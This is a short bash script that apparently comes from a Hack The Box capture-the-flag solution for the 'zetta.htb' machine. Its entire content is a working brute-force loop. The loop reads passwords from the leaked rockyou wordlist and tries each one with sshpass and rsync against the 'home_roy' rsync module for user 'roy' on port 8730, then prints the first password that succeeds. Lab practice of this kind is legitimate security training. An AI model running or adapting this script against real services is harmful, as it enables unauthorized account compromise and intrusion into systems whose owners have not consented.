#!/bin/bash
##
##
###################
##  c/o zetta.htb
##  c/o snowscan, (?), but, obvi
##

for p in $(cat /opt/SecLists/Passwords/Leaked-Databases/rockyou-10.txt)
do
    sshpass -p $p rsync -q rsync://roy@zetta.htb:8730/home_roy
    if [[ $? -eq 0 ]]
    then
        echo "Password Procured Lol: $p"
        exit
    fi
done

##############################
